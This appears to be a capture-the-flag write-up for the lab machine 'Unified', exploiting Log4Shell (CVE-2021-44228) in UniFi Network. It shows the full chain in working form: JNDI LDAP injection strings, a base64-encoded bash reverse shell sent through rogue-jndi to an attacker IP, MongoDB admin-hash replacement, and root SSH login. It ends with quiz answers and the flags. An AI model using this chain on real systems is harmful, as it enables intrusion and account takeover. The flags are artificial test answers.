# Unified - Very Easy

```shell
nmap -T4 -p- -A 10.129.249.213

sudo tcpdump -i tun0 port 389
#this shows vulnerable app sending connection

#install open-jdk and maven
sudo apt install openjdk-11-jdk

sudo apt install maven

git clone https://github.com/veracode-research/rogue-jndi

cd rogue-jndi

mvn package
#creates .jar file

#for payload
echo 'bash -c bash -i >&/dev/tcp/10.10.15.7/4444 0>&1' | base64
#use base64 encoded string for next command

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNy80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.15.7"

#in new tab, setup listener
nc -lvnp 4444

#after getting reverse shell
#upgrade shell
script /dev/null -c bash

ps aux
#show running processes

ps aux | grep mongo
#shows port

mongo --port 27117 ace --eval "db.admin.find();"
#this shows cluttered output, we can slightly modify it using json

mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

mkpasswd -m sha-512 Password123
#this creates custom hash which we can use to replace the previously found hash

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$aF/g8yVDhs72PoC6$m0tNn6si1eaMC.mpSRdEc6DHG0ZRpPN6c1we4QwbJ7bvOeOPk1NSZdWNB3.p1ajPRkZ0rtbS1lErxijzI00kv0"}})'
#the hash has to be replaced
#this updates the website password

ssh root@10.129.249.213
#connect and get root flag
```

```markdown
From the nmap scan, key ports and services are 22 (ssh), 6789 (ibm-db2-admin), 8080 (http-proxy), 8443 (ssl - Nagios NSCA), 8880 (cddbp-alt).

On checking the website hosted at <http://10.129.249.213:8080>, we get the software 'Unifi Network'.

Searching for 'Unifi Network 6.4.54 exploit' gives us CVE-2021-44228.

Following the exploit details, LDAP is the protocol exploited, and its port is 389.

Using the exploit information given on <https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi>, we can carry out the exploit to gain access to the machine.

Using Burp Suite and Foxy Proxy, we insert our payload into the 'remember' field by capturing login request.
Payload - "${jndi:ldap://10.10.15.7/string}"

Send the modified request after starting tcpdump to monitor LDAP connections on its port.

For exploit to be successful, we need open-jdk and maven, and the required GitHub repo.

After the .jar file is created, we need to pass our payload to it.

After creating payload and starting listener, we need to send one more payload in our intercepted request in the 'remember' field.
Payload - "${jndi:ldap://10.10.15.7:1389/o=tomcat}"

After sending the modified request, we get a reverse shell.

The user flag can be found in /home/michael.

Now we can see MongoDB is one of the running processes.

For the default DB name for UniFi apps, Google searching shows the name 'ace'; we can use it in our queries accordingly.

We can connect with the MongoDB service; for the flags, we need to Google keywords such as 'find in MongoDB' and 'enumerate users in Mongo'.

By using db.admin.find(), in the first few lines of the output, we can view the Administrator user and their password hash.

Instead of cracking the password hash, we can use db.admin.update() to update the hash with a password of our own; we can create custom hash using utilities such as mkpasswd.

After replacing the hash, we can login to the Unifi Network website using the creds administrator:Password123

This leads us to the Unifi Network dashboard; we can go to Settings > Device Authentication.

This section includes option for enabled SSH authentication, along with the creds root:NotACrackablePassword4U2022

We can use these creds to login via SSH and get the root flag.
```

1. Which are the first four open ports? - 22,6789,8080,8443

2. What is title of the software that is running on port 8443? - Unifi Network

3. What is the version of the software that is running? - 6.4.54

4. What is the CVE for the identified vulnerability? - CVE-2021-44228

5. What protocol does JNDI leverage in the injection? - LDAP

6. What tool do we use to intercept the traffic, indicating the attack was successful? - tcpdump

7. What port do we need to inspect intercepted traffic for? - 389

8. What port is the MongoDB service runnning on? - 27117

9. What is the default database name for UniFi applications? - ace

10. What is the function we use to enumerate users within the database in MongoDB? - db.admin.find()

11. What is the function we use to update users within the database in MongoDB? - db.admin.update()

12. What is the password for the root user? - NotACrackablePassword4U2022

13. Submit user flag - 6ced1a6a89e666c0620cdb10262ba127

14. Submit root flag - e50bc93c75b634e4b272d2f771c33681
